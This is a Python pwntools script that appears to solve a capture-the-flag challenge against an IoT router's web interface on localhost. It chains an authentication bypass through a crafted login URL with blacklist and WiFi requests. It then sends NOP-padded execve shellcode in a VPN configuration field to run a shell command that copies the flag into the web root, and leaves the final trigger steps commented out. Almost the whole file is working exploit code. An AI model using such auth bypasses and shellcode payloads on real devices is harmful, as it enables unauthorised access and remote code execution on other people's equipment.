from pwn import *
import requests
import json
import sys
import base64
context.arch='amd64'
class IoTClient:
    def __init__(self, base_url="http://localhost:8080"):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()

    def login_bypass(self):
        url = f"{self.base_url}/www/http?action=login&auth=1"
        try:
            resp = self.session.get(url, allow_redirects=False)
            if 'session_id' in self.session.cookies:
                log.info(f"Login bypass success. Session ID: {self.session.cookies['session_id']}")
                return True
            else:
                log.error("Failed to obtain session.")
                return False
        except Exception as e:
            log.error(f"Connection Error: {e}")
            return False

    def _serialize_payload(self, data):
        serialized = {}
        for k, v in data.items():
            if isinstance(v, bytes):
                if k == "custom":
                    serialized[k] = "B64:" + base64.b64encode(v).decode('utf-8')
                else:
                    serialized[k] = "".join(f"\\x{c:02x}" for c in v)
            elif isinstance(v, str):
                serialized[k] = v
            else:
                serialized[k] = v
        return serialized

    def set_vpn(self, name, proto="openvpn", server="127.0.0.1", user="admin", password="password", cert="cert.ovpn", custom=""):
        url = f"{self.base_url}/cgi-bin/vpn.cgi"
        
        payload = self._serialize_payload({
            "action": "set",
            "name": name,
            "proto": proto,
            "server": server,
            "user": user,
            "pass": password,
            "cert": cert,
            "custom": custom
        })
        return self._post_json(url, payload)

    def edit_vpn(self, custom_content):
        url = f"{self.base_url}/cgi-bin/vpn.cgi"
        
        payload = self._serialize_payload({
            "action": "edit",
            "custom": custom_content
        })
        return self._post_json(url, payload)

    def apply_vpn(self):
        url = f"{self.base_url}/cgi-bin/vpn.cgi"
        payload = {
            "action": "apply"
        }
        return self._post_json(url, payload)

    def set_wifi(self, ssid, password):
        url = f"{self.base_url}/cgi-bin/wifi.cgi"
        data = {
            "action": "save",
            "ssid": ssid,
            "password": password
        }
        return self._post_form(url, data)

    def manage_list(self, action, idx, mac="", note=""):
        url = f"{self.base_url}/cgi-bin/list.cgi"
        data = {
            "action": action,
            "idx": idx,
            "mac": mac,
            "note": note
        }
        return self._post_form(url, data)

    def _post_json(self, url, json_data):
        try:
            resp = self.session.post(url, json=json_data)
            return resp.json()
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def _post_form(self, url, data):
        try:
            resp = self.session.post(url, data=data)
            return resp.json()
        except Exception as e:
            return {"status": "error", "message": str(e)}
if __name__ == "__main__":
    client = IoTClient()
    if not client.login_bypass():
        log.error("Login bypass failed. Check if the server is running and reachable.")
        exit(1)
    log.info("Step 1: Setting WiFi...")
    print(client.set_wifi(ssid="1", password="2"))
    log.info("Step 2: Adding 7 blacklist entries...")
    for i in range(7):
        print(client.manage_list(action="add_black", idx=i, mac="123", note="123"))
    log.info("Step 3: Setting VPN initial config...")
    shellcode= asm(shellcraft.execve("/bin/sh",["/bin/sh","-c","cat flag > ./www/flag.html"],0))
    #shellcode=asm(shellcraft.execve("/bin/sh",["/bin/sh","-c","echo a > ./www/flag.html"],0))
    print(client.set_vpn(name="1", proto="openvpn", server="2", user="3", password="4"*0x19, cert=b"\x00\xe9\xf2\x00\x00\x00", custom=shellcode.ljust(0x7eb,b"\x90")+b"\x00"))
"""
    log.info("Step 4: Triggering Edit_VPN_Custom...")
    payload = b"\x21\x5c" 
    print(client.edit_vpn(payload))
    log.info("Step 5: Applying VPN (Trigger Callback)...")
    print(client.apply_vpn())
"""
